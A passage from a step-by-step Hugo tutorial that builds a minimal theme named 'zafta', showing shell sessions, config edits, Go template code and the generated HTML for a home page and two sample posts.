template.\nList Template A list template renders a group of related content. That could be a summary of recent postings or all articles in a category. List templates can contain multiple groups.\nThe homepage template is a special type of list template. Hugo assumes that the home page of your site will act as the portal for the rest of the content in the site.\nPartial Template A partial template is a template that can be included in other templates. Partial templates must be called using the “partial” template command. They are very handy for rolling up common behavior. For example, your site may have a banner that all pages use. Instead of copying the text of the banner into every single and list template, you could create a partial with the banner in it. That way if you decide to change the banner, you only have to change the partial template.\nCreate a New Site Let\u0026rsquo;s use Hugo to create a new web site. I\u0026rsquo;m a Mac user, so I\u0026rsquo;ll create mine in my home directory, in the Sites folder. If you\u0026rsquo;re using Linux, you might have to create the folder first.\nThe \u0026ldquo;new site\u0026rdquo; command will create a skeleton of a site. It will give you the basic directory structure and a useable configuration file.\n$ hugo new site ~/Sites/zafta $ cd ~/Sites/zafta $ ls -l total 8 drwxr-xr-x 7 quoha staff 238 Sep 29 16:49 . drwxr-xr-x 3 quoha staff 102 Sep 29 16:49 .. drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 archetypes -rw-r--r-- 1 quoha staff 82 Sep 29 16:49 config.toml drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 content drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 layouts drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 static $  Take a look in the content/ directory to confirm that it is empty.\nThe other directories (archetypes/, layouts/, and static/) are used when customizing a theme. That\u0026rsquo;s a topic for a different tutorial, so please ignore them for now.\nGenerate the HTML For the New Site Running the hugo command with no options will read all the available content and generate the HTML files. It will also copy all static files (that\u0026rsquo;s everything that\u0026rsquo;s not content). Since we have an empty site, it won\u0026rsquo;t do much, but it will do it very quickly.\n$ hugo --verbose INFO: 2014/09/29 Using config file: config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ WARN: 2014/09/29 Unable to locate layout: [index.html _default/list.html _default/single.html] WARN: 2014/09/29 Unable to locate layout: [404.html] 0 draft content 0 future content 0 pages created 0 tags created 0 categories created in 2 ms $  The \u0026ldquo;--verbose\u0026rdquo; flag gives extra information that will be helpful when we build the template. Every line of the output that starts with \u0026ldquo;INFO:\u0026rdquo; or \u0026ldquo;WARN:\u0026rdquo; is present because we used that flag. The lines that start with \u0026ldquo;WARN:\u0026rdquo; are warning messages. We\u0026rsquo;ll go over them later.\nWe can verify that the command worked by looking at the directory again.\n$ ls -l total 8 drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 archetypes -rw-r--r-- 1 quoha staff 82 Sep 29 16:49 config.toml drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 content drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 layouts drwxr-xr-x 4 quoha staff 136 Sep 29 17:02 public drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 static $  See that new public/ directory? Hugo placed all generated content there. When you\u0026rsquo;re ready to publish your web site, that\u0026rsquo;s the place to start. For now, though, let\u0026rsquo;s just confirm that we have what we\u0026rsquo;d expect from a site with no content.\n$ ls -l public total 16 -rw-r--r-- 1 quoha staff 416 Sep 29 17:02 index.xml -rw-r--r-- 1 quoha staff 262 Sep 29 17:02 sitemap.xml $  Hugo created two XML files, which is standard, but there are no HTML files.\nTest the New Site Verify that you can run the built-in web server. It will dramatically shorten your development cycle if you do. Start it by running the \u0026ldquo;server\u0026rdquo; command. If it is successful, you will see output similar to the following:\n$ hugo server --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ WARN: 2014/09/29 Unable to locate layout: [index.html _default/list.html _default/single.html] WARN: 2014/09/29 Unable to locate layout: [404.html] 0 draft content 0 future content 0 pages created 0 tags created 0 categories created in 2 ms Serving pages from /Users/quoha/Sites/zafta/public Web Server is available at http://localhost:1313 Press Ctrl+C to stop  Connect to the listed URL (it\u0026rsquo;s on the line that starts with \u0026ldquo;Web Server\u0026rdquo;). If everything is working correctly, you should get a page that shows the following:\nindex.xml sitemap.xml  That\u0026rsquo;s a listing of your public/ directory. Hugo didn\u0026rsquo;t create a home page because our site has no content. When there\u0026rsquo;s no index.html file in a directory, the server lists the files in the directory, which is what you should see in your browser.\nLet’s go back and look at those warnings again.\nWARN: 2014/09/29 Unable to locate layout: [index.html _default/list.html _default/single.html] WARN: 2014/09/29 Unable to locate layout: [404.html]  That second warning is easier to explain. We haven’t created a template to be used to generate “page not found errors.” The 404 message is a topic for a separate tutorial.\nNow for the first warning. It is for the home page. You can tell because the first layout that it looked for was “index.html.” That’s only used by the home page.\nI like that the verbose flag causes Hugo to list the files that it\u0026rsquo;s searching for. For the home page, they are index.html, _default/list.html, and _default/single.html. There are some rules that we\u0026rsquo;ll cover later that explain the names and paths. For now, just remember that Hugo couldn\u0026rsquo;t find a template for the home page and it told you so.\nAt this point, you\u0026rsquo;ve got a working installation and site that we can build upon. All that’s left is to add some content and a theme to display it.\nCreate a New Theme Hugo doesn\u0026rsquo;t ship with a default theme. There are a few available (I counted a dozen when I first installed Hugo) and Hugo comes with a command to create new themes.\nWe\u0026rsquo;re going to create a new theme called \u0026ldquo;zafta.\u0026rdquo; Since the goal of this tutorial is to show you how to fill out the files to pull in your content, the theme will not contain any CSS. In other words, ugly but functional.\nAll themes have opinions on content and layout. For example, Zafta uses \u0026ldquo;post\u0026rdquo; over \u0026ldquo;blog\u0026rdquo;. Strong opinions make for simpler templates but differing opinions make it tougher to use themes. When you build a theme, consider using the terms that other themes do.\nCreate a Skeleton Use the hugo \u0026ldquo;new\u0026rdquo; command to create the skeleton of a theme. This creates the directory structure and places empty files for you to fill out.\n$ hugo new theme zafta $ ls -l total 8 drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 archetypes -rw-r--r-- 1 quoha staff 82 Sep 29 16:49 config.toml drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 content drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 layouts drwxr-xr-x 4 quoha staff 136 Sep 29 17:02 public drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 static drwxr-xr-x 3 quoha staff 102 Sep 29 17:31 themes $ find themes -type f | xargs ls -l -rw-r--r-- 1 quoha staff 1081 Sep 29 17:31 themes/zafta/LICENSE.md -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/archetypes/default.md -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/_default/list.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/_default/single.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/partials/footer.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/partials/header.html -rw-r--r-- 1 quoha staff 93 Sep 29 17:31 themes/zafta/theme.toml $  The skeleton includes templates (the files ending in .html), license file, a description of your theme (the theme.toml file), and an empty archetype.\nPlease take a minute to fill out the theme.toml and LICENSE.md files. They\u0026rsquo;re optional, but if you\u0026rsquo;re going to be distributing your theme, it tells the world who to praise (or blame). It\u0026rsquo;s also nice to declare the license so that people will know how they can use the theme.\n$ vi themes/zafta/theme.toml author = \u0026quot;michael d henderson\u0026quot; description = \u0026quot;a minimal working template\u0026quot; license = \u0026quot;MIT\u0026quot; name = \u0026quot;zafta\u0026quot; source_repo = \u0026quot;\u0026quot; tags = [\u0026quot;tags\u0026quot;, \u0026quot;categories\u0026quot;] :wq ## also edit themes/zafta/LICENSE.md and change ## the bit that says \u0026quot;YOUR_NAME_HERE\u0026quot;  Note that the the skeleton\u0026rsquo;s template files are empty. Don\u0026rsquo;t worry, we\u0026rsquo;ll be changing that shortly.\n$ find themes/zafta -name '*.html' | xargs ls -l -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/_default/list.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/_default/single.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/partials/footer.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/partials/header.html $  Update the Configuration File to Use the Theme Now that we\u0026rsquo;ve got a theme to work with, it\u0026rsquo;s a good idea to add the theme name to the configuration file. This is optional, because you can always add \u0026ldquo;-t zafta\u0026rdquo; on all your commands. I like to put it the configuration file because I like shorter command lines. If you don\u0026rsquo;t put it in the configuration file or specify it on the command line, you won\u0026rsquo;t use the template that you\u0026rsquo;re expecting to.\nEdit the file to add the theme, add a title for the site, and specify that all of our content will use the TOML format.\n$ vi config.toml theme = \u0026quot;zafta\u0026quot; baseurl = \u0026quot;\u0026quot; languageCode = \u0026quot;en-us\u0026quot; title = \u0026quot;zafta - totally refreshing\u0026quot; MetaDataFormat = \u0026quot;toml\u0026quot; :wq $  Generate the Site Now that we have an empty theme, let\u0026rsquo;s generate the site again.\n$ hugo --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 0 pages created 0 tags created 0 categories created in 2 ms $  Did you notice that the output is different? The warning message for the home page has disappeared and we have an additional information line saying that Hugo is syncing from the theme\u0026rsquo;s directory.\nLet\u0026rsquo;s check the public/ directory to see what Hugo\u0026rsquo;s created.\n$ ls -l public total 16 drwxr-xr-x 2 quoha staff 68 Sep 29 17:56 css -rw-r--r-- 1 quoha staff 0 Sep 29 17:56 index.html -rw-r--r-- 1 quoha staff 407 Sep 29 17:56 index.xml drwxr-xr-x 2 quoha staff 68 Sep 29 17:56 js -rw-r--r-- 1 quoha staff 243 Sep 29 17:56 sitemap.xml $  Notice four things:\n Hugo created a home page. This is the file public/index.html. Hugo created a css/ directory. Hugo created a js/ directory. Hugo claimed that it created 0 pages. It created a file and copied over static files, but didn\u0026rsquo;t create any pages. That\u0026rsquo;s because it considers a \u0026ldquo;page\u0026rdquo; to be a file created directly from a content file. It doesn\u0026rsquo;t count things like the index.html files that it creates automatically.  The Home Page Hugo supports many different types of templates. The home page is special because it gets its own type of template and its own template file. The file, layouts/index.html, is used to generate the HTML for the home page. The Hugo documentation says that this is the only required template, but that depends. Hugo\u0026rsquo;s warning message shows that it looks for three different templates:\nWARN: 2014/09/29 Unable to locate layout: [index.html _default/list.html _default/single.html]  If it can\u0026rsquo;t find any of these, it completely skips creating the home page. We noticed that when we built the site without having a theme installed.\nWhen Hugo created our theme, it created an empty home page template. Now, when we build the site, Hugo finds the template and uses it to generate the HTML for the home page. Since the template file is empty, the HTML file is empty, too. If the template had any rules in it, then Hugo would have used them to generate the home page.\n$ find . -name index.html | xargs ls -l -rw-r--r-- 1 quoha staff 0 Sep 29 20:21 ./public/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 ./themes/zafta/layouts/index.html $  The Magic of Static Hugo does two things when generating the site. It uses templates to transform content into HTML and it copies static files into the site. Unlike content, static files are not transformed. They are copied exactly as they are.\nHugo assumes that your site will use both CSS and JavaScript, so it creates directories in your theme to hold them. Remember opinions? Well, Hugo\u0026rsquo;s opinion is that you\u0026rsquo;ll store your CSS in a directory named css/ and your JavaScript in a directory named js/. If you don\u0026rsquo;t like that, you can change the directory names in your theme directory or even delete them completely. Hugo\u0026rsquo;s nice enough to offer its opinion, then behave nicely if you disagree.\n$ find themes/zafta -type d | xargs ls -ld drwxr-xr-x 7 quoha staff 238 Sep 29 17:38 themes/zafta drwxr-xr-x 3 quoha staff 102 Sep 29 17:31 themes/zafta/archetypes drwxr-xr-x 5 quoha staff 170 Sep 29 17:31 themes/zafta/layouts drwxr-xr-x 4 quoha staff 136 Sep 29 17:31 themes/zafta/layouts/_default drwxr-xr-x 4 quoha staff 136 Sep 29 17:31 themes/zafta/layouts/partials drwxr-xr-x 4 quoha staff 136 Sep 29 17:31 themes/zafta/static drwxr-xr-x 2 quoha staff 68 Sep 29 17:31 themes/zafta/static/css drwxr-xr-x 2 quoha staff 68 Sep 29 17:31 themes/zafta/static/js $  The Theme Development Cycle When you\u0026rsquo;re working on a theme, you will make changes in the theme\u0026rsquo;s directory, rebuild the site, and check your changes in the browser. Hugo makes this very easy:\n Purge the public/ directory. Run the built in web server in watch mode. Open your site in a browser. Update the theme. Glance at your browser window to see changes. Return to step 4.  I’ll throw in one more opinion: never work on a theme on a live site. Always work on a copy of your site. Make changes to your theme, test them, then copy them up to your site. For added safety, use a tool like Git to keep a revision history of your content and your theme. Believe me when I say that it is too easy to lose both your mind and your changes.\nCheck the main Hugo site for information on using Git with Hugo.\nPurge the public/ Directory When generating the site, Hugo will create new files and update existing ones in the public/ directory. It will not delete files that are no longer used. For example, files that were created in the wrong directory or with the wrong title will remain. If you leave them, you might get confused by them later. I recommend cleaning out your site prior to generating it.\nNote: If you\u0026rsquo;re building on an SSD, you should ignore this. Churning on a SSD can be costly.\nHugo\u0026rsquo;s Watch Option Hugo\u0026rsquo;s \u0026ldquo;--watch\u0026rdquo; option will monitor the content/ and your theme directories for changes and rebuild the site automatically.\nLive Reload Hugo\u0026rsquo;s built in web server supports live reload. As pages are saved on the server, the browser is told to refresh the page. Usually, this happens faster than you can say, \u0026ldquo;Wow, that\u0026rsquo;s totally amazing.\u0026rdquo;\nDevelopment Commands Use the following commands as the basis for your workflow.\n## purge old files. hugo will recreate the public directory. ## $ rm -rf public ## ## run hugo in watch mode ## $ hugo server --watch --verbose  Here\u0026rsquo;s sample output showing Hugo detecting a change to the template for the home page. Once generated, the web browser automatically reloaded the page. I\u0026rsquo;ve said this before, it\u0026rsquo;s amazing.\n$ rm -rf public $ hugo server --watch --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 0 pages created 0 tags created 0 categories created in 2 ms Watching for changes in /Users/quoha/Sites/zafta/content Serving pages from /Users/quoha/Sites/zafta/public Web Server is available at http://localhost:1313 Press Ctrl+C to stop INFO: 2014/09/29 File System Event: [\u0026quot;/Users/quoha/Sites/zafta/themes/zafta/layouts/index.html\u0026quot;: MODIFY|ATTRIB] Change detected, rebuilding site WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 0 pages created 0 tags created 0 categories created in 1 ms  Update the Home Page Template The home page is one of a few special pages that Hugo creates automatically. As mentioned earlier, it looks for one of three files in the theme\u0026rsquo;s layout/ directory:\n index.html _default/list.html _default/single.html  We could update one of the default templates, but a good design decision is to update the most specific template available. That\u0026rsquo;s not a hard and fast rule (in fact, we\u0026rsquo;ll break it a few times in this tutorial), but it is a good generalization.\nMake a Static Home Page Right now, that page is empty because we don\u0026rsquo;t have any content and we don\u0026rsquo;t have any logic in the template. Let\u0026rsquo;s change that by adding some text to the template.\n$ vi themes/zafta/layouts/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;hugo says hello!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :wq $  Build the web site and then verify the results.\n$ hugo --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 0 pages created 0 tags created 0 categories created in 2 ms $ find public -type f -name '*.html' | xargs ls -l -rw-r--r-- 1 quoha staff 78 Sep 29 21:26 public/index.html $ cat public/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;hugo says hello!\u0026lt;/p\u0026gt; \u0026lt;/html\u0026gt;  Live Reload Note: If you\u0026rsquo;re running the server with the --watch option, you\u0026rsquo;ll see different content in the file:\n$ cat public/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;hugo says hello!\u0026lt;/p\u0026gt; \u0026lt;script\u0026gt;document.write('\u0026lt;script src=\u0026quot;http://' + (location.host || 'localhost').split(':')[0] + ':1313/livereload.js?mindelay=10\u0026quot;\u0026gt;\u0026lt;/' + 'script\u0026gt;')\u0026lt;/script\u0026gt;\u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  When you use --watch, the Live Reload script is added by Hugo. Look for live reload in the documentation to see what it does and how to disable it.\nBuild a \u0026ldquo;Dynamic\u0026rdquo; Home Page \u0026ldquo;Dynamic home page?\u0026rdquo; Hugo\u0026rsquo;s a static web site generator, so this seems an odd thing to say. I mean let\u0026rsquo;s have the home page automatically reflect the content in the site every time Hugo builds it. We\u0026rsquo;ll use iteration in the template to do that.\nCreate New Posts Now that we have the home page generating static content, let\u0026rsquo;s add some content to the site. We\u0026rsquo;ll display these posts as a list on the home page and on their own page, too.\nHugo has a command to generate a skeleton post, just like it does for sites and themes.\n$ hugo --verbose new post/first.md INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 attempting to create post/first.md of post INFO: 2014/09/29 curpath: /Users/quoha/Sites/zafta/themes/zafta/archetypes/default.md ERROR: 2014/09/29 Unable to Cast \u0026lt;nil\u0026gt; to map[string]interface{} $  That wasn\u0026rsquo;t very nice, was it?\nThe \u0026ldquo;new\u0026rdquo; command uses an archetype to create the post file. Hugo created an empty default archetype file, but that causes an error when there\u0026rsquo;s a theme. For me, the workaround was to create an archetypes file specifically for the post type.\n$ vi themes/zafta/archetypes/post.md +++ Description = \u0026quot;\u0026quot; Tags = [] Categories = [] +++ :wq $ find themes/zafta/archetypes -type f | xargs ls -l -rw-r--r-- 1 quoha staff 0 Sep 29 21:53 themes/zafta/archetypes/default.md -rw-r--r-- 1 quoha staff 51 Sep 29 21:54 themes/zafta/archetypes/post.md $ hugo --verbose new post/first.md INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 attempting to create post/first.md of post INFO: 2014/09/29 curpath: /Users/quoha/Sites/zafta/themes/zafta/archetypes/post.md INFO: 2014/09/29 creating /Users/quoha/Sites/zafta/content/post/first.md /Users/quoha/Sites/zafta/content/post/first.md created $ hugo --verbose new post/second.md INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 attempting to create post/second.md of post INFO: 2014/09/29 curpath: /Users/quoha/Sites/zafta/themes/zafta/archetypes/post.md INFO: 2014/09/29 creating /Users/quoha/Sites/zafta/content/post/second.md /Users/quoha/Sites/zafta/content/post/second.md created $ ls -l content/post total 16 -rw-r--r-- 1 quoha staff 104 Sep 29 21:54 first.md -rw-r--r-- 1 quoha staff 105 Sep 29 21:57 second.md $ cat content/post/first.md +++ Categories = [] Description = \u0026quot;\u0026quot; Tags = [] date = \u0026quot;2014-09-29T21:54:53-05:00\u0026quot; title = \u0026quot;first\u0026quot; +++ my first post $ cat content/post/second.md +++ Categories = [] Description = \u0026quot;\u0026quot; Tags = [] date = \u0026quot;2014-09-29T21:57:09-05:00\u0026quot; title = \u0026quot;second\u0026quot; +++ my second post $  Build the web site and then verify the results.\n$ rm -rf public $ hugo --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 found taxonomies: map[string]string{\u0026quot;category\u0026quot;:\u0026quot;categories\u0026quot;, \u0026quot;tag\u0026quot;:\u0026quot;tags\u0026quot;} WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 2 pages created 0 tags created 0 categories created in 4 ms $  The output says that it created 2 pages. Those are our new posts:\n$ find public -type f -name '*.html' | xargs ls -l -rw-r--r-- 1 quoha staff 78 Sep 29 22:13 public/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:13 public/post/first/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:13 public/post/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:13 public/post/second/index.html $  The new files are empty because because the templates used to generate the content are empty. The homepage doesn\u0026rsquo;t show the new content, either. We have to update the templates to add the posts.\nList and Single Templates In Hugo, we have three major kinds of templates. There\u0026rsquo;s the home page template that we updated previously. It is used only by the home page. We also have \u0026ldquo;single\u0026rdquo; templates which are used to generate output for a single content file. We also have \u0026ldquo;list\u0026rdquo; templates that are used to group multiple pieces of content before generating output.\nGenerally speaking, list templates are named \u0026ldquo;list.html\u0026rdquo; and single templates are named \u0026ldquo;single.html.\u0026rdquo;\nThere are three other types of templates: partials, content views, and terms. We will not go into much detail on these.\nAdd Content to the Homepage The home page will contain a list of posts. Let\u0026rsquo;s update its template to add the posts that we just created. The logic in the template will run every time we build the site.\n$ vi themes/zafta/layouts/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; {{ range first 10 .Data.Pages }} \u0026lt;h1\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; {{ end }} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :wq $  Hugo uses the Go template engine. That engine scans the template files for commands which are enclosed between \u0026ldquo;{{\u0026rdquo; and \u0026ldquo;}}\u0026rdquo;. In our template, the commands are:\n range .Title end  The \u0026ldquo;range\u0026rdquo; command is an iterator. We\u0026rsquo;re going to use it to go through the first ten pages. Every HTML file that Hugo creates is treated as a page, so looping through the list of pages will look at every file that will be created.\nThe \u0026ldquo;.Title\u0026rdquo; command prints the value of the \u0026ldquo;title\u0026rdquo; variable. Hugo pulls it from the front matter in the Markdown file.\nThe \u0026ldquo;end\u0026rdquo; command signals the end of the range iterator. The engine loops back to the top of the iteration when it finds \u0026ldquo;end.\u0026rdquo; Everything between the \u0026ldquo;range\u0026rdquo; and \u0026ldquo;end\u0026rdquo; is evaluated every time the engine goes through the iteration. In this file, that would cause the title from the first ten pages to be output as heading level one.\nIt\u0026rsquo;s helpful to remember that some variables, like .Data, are created before any output files. Hugo loads every content file into the variable and then gives the template a chance to process before creating the HTML files.\nBuild the web site and then verify the results.\n$ rm -rf public $ hugo --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 found taxonomies: map[string]string{\u0026quot;tag\u0026quot;:\u0026quot;tags\u0026quot;, \u0026quot;category\u0026quot;:\u0026quot;categories\u0026quot;} WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 2 pages created 0 tags created 0 categories created in 4 ms $ find public -type f -name '*.html' | xargs ls -l -rw-r--r-- 1 quoha staff 94 Sep 29 22:23 public/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:23 public/post/first/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:23 public/post/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:23 public/post/second/index.html $ cat public/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;second\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;first\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $  Congratulations, the home page shows the title of the two posts. The posts themselves are still empty, but let\u0026rsquo;s take a moment to appreciate what we\u0026rsquo;ve done. Your template now generates output dynamically. Believe it or not, by inserting the range command inside of those curly braces, you\u0026rsquo;ve learned everything you need to know to build a theme. All that\u0026rsquo;s really left is understanding which template will be used to generate each content file and becoming familiar with the commands for the template engine.\nAnd, if that were entirely true, this tutorial would be much shorter. There are a few things to know that will make creating a new template much easier. Don\u0026rsquo;t worry, though, that\u0026rsquo;s all to come.\nAdd Content to the Posts We\u0026rsquo;re working with posts, which are in the content/post/ directory. That means that their section is \u0026ldquo;post\u0026rdquo; (and if we don\u0026rsquo;t do something weird, their type is also \u0026ldquo;post\u0026rdquo;).\nHugo uses the section and type to find the template file for every piece of content. Hugo will first look for a template file that matches the section or type name. If it can\u0026rsquo;t find one, then it will look in the _default/ directory. There are some twists that we\u0026rsquo;ll cover when we get to categories and tags, but for now we can assume that Hugo will try post/single.html, then _default/single.html.\nNow that we know the search rule, let\u0026rsquo;s see what we actually have available:\n$ find themes/zafta -name single.html | xargs ls -l -rw-r--r-- 1 quoha staff 132 Sep 29 17:31 themes/zafta/layouts/_default/single.html  We could create a new template, post/single.html, or change the default. Since we don\u0026rsquo;t know of any other content types, let\u0026rsquo;s start with updating the default.\nRemember, any content that we haven\u0026rsquo;t created a template for will end up using this template. That can be good or bad. Bad because I know that we\u0026rsquo;re going to be adding different types of content and we\u0026rsquo;re going to end up undoing some of the changes we\u0026rsquo;ve made. It\u0026rsquo;s good because we\u0026rsquo;ll be able to see immediate results. It\u0026rsquo;s also good to start here because we can start to build the basic layout for the site. As we add more content types, we\u0026rsquo;ll refactor this file and move logic around. Hugo makes that fairly painless, so we\u0026rsquo;ll accept the cost and proceed.\nPlease see the Hugo documentation on template rendering for all the details on determining which template to use. And, as the docs mention, if you\u0026rsquo;re building a single page application (SPA) web site, you can delete all of the other templates and work with just the default single page. That\u0026rsquo;s a refreshing amount of joy right there.\nUpdate the Template File $ vi themes/zafta/layouts/_default/single.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;{{ .Title }}\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; {{ .Content }} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :wq $  Build the web site and verify the results.\n$ rm -rf public $ hugo --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 found taxonomies: map[string]string{\u0026quot;tag\u0026quot;:\u0026quot;tags\u0026quot;, \u0026quot;category\u0026quot;:\u0026quot;categories\u0026quot;} WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 2 pages created 0 tags created 0 categories created in 4 ms $ find public -type f -name '*.html' | xargs ls -l -rw-r--r-- 1 quoha staff 94 Sep 29 22:40 public/index.html -rw-r--r-- 1 quoha staff 125 Sep 29 22:40 public/post/first/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:40 public/post/index.html -rw-r--r-- 1 quoha staff 128 Sep 29 22:40 public/post/second/index.html $ cat public/post/first/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;first\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;first\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;my first post\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $ cat public/post/second/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;second\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;second\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;my second post\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $  Notice that the posts now have content. You can go to localhost:1313/post/first to verify.\nLinking to Content The posts are on the home page. Let\u0026rsquo;s add a link from there to the post. Since this is the home page, we\u0026rsquo;ll update its template.\n$ vi themes/zafta/layouts/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; {{ range first 10 .Data.Pages }} \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026quot;{{ .Permalink }}\u0026quot;\u0026gt;{{ .Title }}\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; {{ end }} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Build the web site and verify the results.\n$ rm -rf public $ hugo --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ 